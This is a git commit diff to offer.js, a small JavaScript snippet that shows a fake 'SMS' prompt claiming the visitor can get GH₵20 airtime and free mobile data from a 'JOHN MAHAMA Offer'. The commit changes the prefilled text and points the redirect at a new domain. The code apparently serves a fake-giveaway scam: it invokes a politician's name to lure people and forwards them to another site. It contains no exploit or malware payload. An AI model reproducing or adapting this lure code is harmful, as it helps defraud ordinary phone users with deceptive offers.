af774e6cd9b4505cb645207f3b24e8dff4117172
codexken <inyeneawakessien@gmail.com>
2024-08-16 05:08:18 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '15GB Free Data'
-password=prompt('SMS: Congratulations You are Eligible to receive GH₵20 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
-if (password != '15GB Free Data') {
-location.href='https://mahama.data-offer.xyz/15GB';
+var password = '10GB + GH₵20 Airtime'
+password=prompt('SMS: Congratulations You are Eligible to receive GH₵20 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','10GB + GH₵20 Airtime');
+if (password != '10GB + GH₵20 Airtime') {
+location.href='https://king-promise.4g-data.info/10GB';
 }
